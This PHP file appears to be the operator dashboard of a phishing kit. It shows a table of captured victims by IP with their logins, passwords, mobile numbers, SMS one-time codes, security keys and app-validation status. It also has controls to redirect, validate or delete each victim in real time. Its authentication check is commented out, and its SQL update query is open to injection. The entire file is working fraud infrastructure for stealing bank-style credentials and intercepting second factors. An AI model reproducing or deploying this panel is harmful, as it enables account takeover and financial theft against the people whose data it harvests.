<?php
session_start();
include "config.php";
/*if(!$_SESSION["login"]) {
   header("Location: login.php"); die();
}*/




  if (isset($_POST['submitmodel'])) {
    $cles = $_POST['cle'];
    $pages =$_POST['page'];
    $ipmo = $_POST['ipmodel'];
    $sqls ="UPDATE user  set cle ='$cles',pagere ='$pages'  where IP='$ipmo';";
   $rets = $db->exec($sqls);
   if(!$rets) {
      echo $db->lastErrorMsg();
   } else {
      $db->changes();
      header("Refresh:0");
   }
   }
?>
<html lang="en" dir=""><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Dashboard v1 | Gull Admin Template</title>
    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,400i,600,700,800,900" rel="stylesheet">
    <link href="css/themes/lite-purple.min.css" rel="stylesheet">
    <link href="css/plugins/perfect-scrollbar.min.css" rel="stylesheet">
    <style type="text/css">
        [class*=" i-"], [class^="i-"] {
    font-family: "iconsmind" !important;
    speak: none;
    font-style: normal;
    font-weight: bold;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
.dark-theme a {
    color: #ffffff !important;
}

.hiddenthis {
    display: none;
}

    </style>
</head>

<body class="text-left dark-theme">
    <div class="app-admin-wrap layout-horizontal-bar">
        <div class="main-header">
            <div class="logo"><img src="images/logo.png" alt=""></div>
            <div class="menu-toggle">
                <div></div>
                <div></div>
                <div></div>
            </div>
            
            <div style="margin: auto"></div>
            
        </div>
        <!-- header top menu end-->
        <div class="horizontal-bar-wrap">
            <div class="header-topnav">
                <div class="container-fluid">
                    <div class="topnav rtl-ps-none ps" id="" data-perfect-scrollbar="" data-suppress-scroll-x="true">
                        <ul class="menu float-left">
                            <li>
                                <div>
                                    <div>
                                       <a href="index.php">User</a>
                                        
                                        
                                    </div>
                                </div>
                            </li>
                            <li>
                                <div>
                                    <div>
                                      <a href="email.php">Email</a>
                                        
                                        
                                    </div>
                                </div>
                            </li>
                            <!-- end ui kits-->
                            <li>
                                <div>
                                    <div>
                                       <a href="mobile.php">Phone number</a>
                                        
                                        
                                    </div>
                                </div>
                            </li>
                            
                            
          
                        </ul>
                    <div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; height: 48px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 4px;"></div></div><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; height: 48px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 4px;"></div></div><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div></div><div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div></div></div>
                </div>
            </div>
        </div>
        <!-- =============== Horizontal bar End ================-->
        <div class="main-content-wrap d-flex flex-column">
            <!-- ============ Body content start ============= -->
            <div class="main-content">            
                <div class="row">
    <div class="col-md-12">
                        <div class="card mb-4">
                            <div class="card-body">
                                
                                
<label class="switch pr-5 switch-danger mr-3"><span>Date</span>
     <input type="checkbox" id="datecheck"  onclick="hideshow()"><span class="slider"></span>
                             </label>
<label class="switch pr-5 switch-danger mr-3"><span>Mobile</span>
                                    <input type="checkbox"  id="mobilecheck"  onclick="hideshowmobile()"><span class="slider"></span>
                                </label>
 <label class="switch pr-5 switch-danger mr-3"><span>SMS(1)</span>
                                    <input type="checkbox"  id="smscheck"  onclick="hideshowsms()"><span class="slider"></span>
                                </label>
<label class="switch pr-5 switch-danger mr-3"><span>Comment</span>
                                    <input type="checkbox"  id="cmtcheck"  onclick="hideshowcmt()"><span class="slider"></span>
                                </label>
                                
                                
                                
                                
                            </div>
                        </div>
                    </div>
                  <div class="table-responsive">
                                    <table class="table table-dark">
                                        <thead>
                                        </thead><thead>
                                            <tr>
                                                <th>IP</th>
                                                <th class="thdatecheck">date</th>
                                                <th>Login</th>
                                                <th>Password</th>
                                                <th class="thmobilecheck">Mobile</th>
                                                <th>Page</th>
                                                <th class="thsmscheck">Sms(1)</th>
                                                <th>Cle</th>
                                                <th>Code Cle</th>
                                                <th>Sms(2)</th>
                                                <th>Valid App</th>                                            
                                                <th class="thcmtcheck">Comment</th>
                                                <th>Action</th>
                                            </tr>
                                        </thead>
                                        
                                        <tbody id="bodytable">
                                                  <?php

                                           $sql ="SELECT * from user;";
                                           $ret = $db->query($sql);
                                           while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
                                            $ip = $row['IP'];
                                          ?>
                                         <tr class="tr-shadow">
                                      <td><?php echo mb_substr($row['IP'] , 0 , 20, "utf8" ) ?></td>
                                            <td class="thdatecheck"><?php echo mb_substr($row['datelog'] , 0 , 20, "utf8" ) ?></td>
                                            <td><?php echo mb_substr($row['user'] , 0 , 20, "utf8" ) ?></td>
                                            <td><?php echo mb_substr($row['pin'] , 0 , 20, "utf8" ) ?></td>
                                            <td class="thmobilecheck"><?php echo mb_substr($row['mobile'] , 0 , 20, "utf8" ) ?></td>
                                            <td><?php if($row['pagere']=='')
                                            {
                                                ?>
                                              <button  onclick="showdata('<?php echo $row['IP'] ?>')" class="btn btn-primary btn-rounded m-1" type="button" data-toggle="modal" data-target=".bd-example-modal-sm" style="margin: 0px !important;"><i class="nav-icon i-Link"></i></button>
                                           <?php 
                                            }
                                            else{
                                                echo '<span class="badge badge-warning">'.$row['pagere'].'</span>';
                                            }?>
                                                
                                            </td>
                                            <td class="thsmscheck"><?php echo mb_substr($row['sms'] , 0 , 20, "utf8" ) ?></td>
                                            <td><?php echo mb_substr($row['cle'] , 0 , 20, "utf8" ) ?></td>
                                            <td><?php echo mb_substr($row['code'] , 0 , 20, "utf8" ) ?></td>
                                            <td><?php echo mb_substr($row['sms2'] , 0 , 20, "utf8" ) ?></td>
                                            <td><span class="badge badge-warning"><?php echo mb_substr($row['appckeck'] , 0 , 20, "utf8" ) ?></span></td>
                                            <td class="thcmtcheck"><?php echo mb_substr($row['comment'] , 0 , 20, "utf8" ) ?></td>
                                            <td>
                                                    <a  class="btn btn-success" href="alyss.php?ip=<?php echo mb_substr($row['IP'] , 0 , 20, "utf8" ) ?>"><i class="nav-icon i-Pen-2"></i></a>
                                                    <a class="btn btn-danger"  href="delete.php?ip=<?php echo mb_substr($row['IP'] , 0 , 20, "utf8" ) ?>"><i class="nav-icon i-Close-Window"></i></a>
                                                     <a class="btn btn-warning"  href="validapp.php?ip=<?php echo mb_substr($row['IP'] , 0 , 20, "utf8" ) ?>"><i class="nav-icon i-Security-Check"></i></a>
                                            </td>
                                                
                                            </tr>
                                                 <?php


                                             }
                                             $db->close();


                                            ?>
                                            
                                        </tbody>
                                    </table>
                                </div>  
                    
                </div>
                <!-- end of main-content -->
            </div><!-- Footer Start -->
            <div class="flex-grow-1"></div>
            
            <!-- fotter end -->
        </div>
    </div><!-- ============ Search UI Start ============= -->
  
<div class="modal fade bd-example-modal-sm" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle-1" style="display: none;" aria-hidden="true">
                    <div class="modal-dialog modal-sm">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="exampleModalCenterTitle-1" style="color: black">Redirection</h5>
                                <button class="close" type="button" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
                            </div>
                            <div class="modal-body" id="txtHint">
                              


                            </div>
                            <div class="modal-footer">
                 <button class="btn btn-secondary" type="button" data-dismiss="modal">Close</button>
                            </div>
                        </div>
                    </div>
                </div>
    <!-- ============ Search UI End ============= -->
    <script src="js/plugins/jquery-3.3.1.min.js"></script>
    <script src="js/plugins/bootstrap.bundle.min.js"></script>
    <script src="js/plugins/perfect-scrollbar.min.js"></script>
    <script src="js/scripts/script.min.js"></script>
    <script src="js/scripts/sidebar-horizontal.script.js"></script>
    <script src="js/plugins/echarts.min.js"></script>
    <script src="js/scripts/echart.options.min.js"></script>
    <script src="js/scripts/dashboard.v1.script.min.js"></script>


<script>
function showdata(str) {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        document.getElementById("txtHint").innerHTML = this.responseText;
      }
    }
    xmlhttp.open("GET", "getdata.php?ip="+str, true);
    xmlhttp.send();
  }
</script>


<script>
function hideshow() {
  var checkBox = document.getElementById("datecheck");
  if (checkBox.checked == true){
     $(".thdatecheck").addClass("hiddenthis");
  } else {
    $(".thdatecheck").removeClass("hiddenthis");
  }
}

function hideshowmobile() {
  var checkBoxmob = document.getElementById("mobilecheck");
    if (checkBoxmob.checked == true){
     $(".thmobilecheck").addClass("hiddenthis");
  } else {
    $(".thmobilecheck").removeClass("hiddenthis");
  }   
}
function hideshowsms() {
  var checkBoxsms = document.getElementById("smscheck");
    if (checkBoxsms.checked == true){
     $(".thsmscheck").addClass("hiddenthis");
  } else {
    $(".thsmscheck").removeClass("hiddenthis");
  }
    
}
function hideshowcmt() {
  var checkBoxcmt = document.getElementById("cmtcheck");
    if (checkBoxcmt.checked == true){
     $(".thcmtcheck").addClass("hiddenthis");
  } else {
    $(".thcmtcheck").removeClass("hiddenthis");
  }
}
</script>

</body></html>